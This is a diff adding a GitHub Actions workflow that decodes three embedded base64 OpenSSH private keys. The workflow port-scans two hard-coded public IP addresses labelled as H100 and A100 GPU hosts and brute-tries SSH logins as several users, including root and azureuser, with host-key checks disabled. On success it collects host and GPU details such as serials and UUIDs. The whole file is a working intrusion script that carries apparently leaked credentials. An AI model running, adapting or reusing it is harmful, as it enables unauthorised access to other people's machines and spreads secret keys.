@@ -1,0 +1,52 @@
+name: ul9007b
+on:
+  workflow_dispatch:
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: prep
+        run: |
+          curl -s -m 10 https://api.ipify.org; echo
+          mkdir -p /tmp/k
+          echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNEQUhXVVdYb0hZUXpKWS9oZWlKSU1qUnp2QWo3Q0RhUW93dmVsbnozaGFwZ0FBCkFJaStFT3B3dmhEcWNBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDREFIV1VXWG9IWVF6SlkvaGVpSklNalJ6dkEKajdDRGFRb3d2ZWxuejNoYXBnQUFBRUEwYUgzbEYzZFV4OHlWMW55N2RWSnhrVEtGTk9TaTF6N1hJTzR0bkd3TgpMTUFkWlJaZWdkaERNbGorRjZJa2d5TkhPOENQc0lOcENqQzk2V2ZQZUZxbUFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K' | base64 -d > /tmp/k/ibm_key.pem
+          echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNERGJlV2Q2bTdLZU9rUUh3SDlRY1M5eFlOQ1I2UFNWS3JUL1hDalZZZjNLUUFBCkFJZ2pLZ3M0SXlvTE9BQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRERiZVdkNm03S2VPa1FId0g5UWNTOXhZTkMKUjZQU1ZLclQvWENqVllmM0tRQUFBRUIwTVo3ZG1zU3BWNGxvNTkvUFZ6eTFacFJBcWptZjA0M2hvVjd6OWxKRQozc050NVozcWJzcDQ2UkFmQWYxQnhMM0ZnMEpIbzlKVXF0UDljS05WaC9jcEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K' | base64 -d > /tmp/k/k04_key.pem
+          echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMVB5bng0dS9kR0ZUMnFUa3lQRXZ5SWtBdmxIcE1jekJSbDE1bGFjSmJSUUFBCkFJZzBxeCt1TktzZnJnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFQeW54NHUvZEdGVDJxVGt5UEV2eUlrQXYKbEhwTWN6QlJsMTVsYWNKYlJRQUFBRUNyWkg5bmtEbThyYnVINDdGdHpsQ1Fmd01BRGREVk54WXZHcVNnVHd0YwpESFUvS2ZIaTc5MFlWUGFwT1RJOFMvSWlRQytVZWt4ek1GR1hYbVZwd2x0RkFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K' | base64 -d > /tmp/k/azadmin.pem
+          chmod 600 /tmp/k/*
+          for f in /tmp/k/*; do ssh-keygen -y -f "$f" >/dev/null 2>&1 && echo "ok $(basename $f) $(ssh-keygen -y -f $f | cut -c1-40)" || echo "bad $(basename $f)"; done
+      - name: matrix
+        run: |
+          python3 - <<'PY'
+          import subprocess,os,time,glob,socket
+          HOSTS=[('H100','40.123.206.138'),('A100','51.104.16.184')]
+          PORTS=[22,443,3389,5985,8888,10250,2375,6443,9400,80]
+          USERS=['t19','ubuntu','azureuser','root','admin','ul']
+          def P(*a): print(*a,flush=True)
+          for lbl,ip in HOSTS:
+              for p in PORTS:
+                  t=time.time()
+                  try:
+                      s=socket.create_connection((ip,p),timeout=6); s.settimeout(4)
+                      try: b=s.recv(80)
+                      except Exception: b=b''
+                      P('PORT',lbl,ip,p,'OPEN',round(time.time()-t,1),repr(b[:60])); s.close()
+                  except Exception as e:
+                      P('PORT',lbl,ip,p,'FAIL',round(time.time()-t,1),type(e).__name__)
+          keys=sorted(glob.glob('/tmp/k/*'))
+          for lbl,ip in HOSTS:
+              for u in USERS:
+                  for k in keys:
+                      t=time.time()
+                      r=subprocess.run(['ssh','-i',k,'-o','BatchMode=yes','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=7','-o','IdentitiesOnly=yes','-o','IdentityAgent=none','-o','PreferredAuthentications=publickey',u+'@'+ip,'id; hostname -I; nvidia-smi -L'],capture_output=True,text=True,timeout=40)
+                      out=(r.stdout+r.stderr).strip().replace(chr(10),' | ')[:220]
+                      P('SSH',lbl,ip,u,os.path.basename(k),'rc=%d'%r.returncode,round(time.time()-t,1),out)
+                      if r.returncode==0:
+                          for cmd in ['id','hostname -I','nvidia-smi -L','nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv']:
+                              q=subprocess.run(['ssh','-i',k,'-o','BatchMode=yes','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=7',u+'@'+ip,cmd],capture_output=True,text=True,timeout=40)
+                              P('CENSUS',ip,u,os.path.basename(k),cmd,'=>',(q.stdout+q.stderr).strip()[:400])
+          P('NEGCTL fabricated-key test:')
+          subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/k/zzbogus'],capture_output=True)
+          r=subprocess.run(['ssh','-i','/tmp/k/zzbogus','-o','BatchMode=yes','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=7','t19@40.123.206.138','id'],capture_output=True,text=True,timeout=40)
+          P('NEGCTL rc=%d'%r.returncode,(r.stdout+r.stderr).strip()[:200])
+          PY
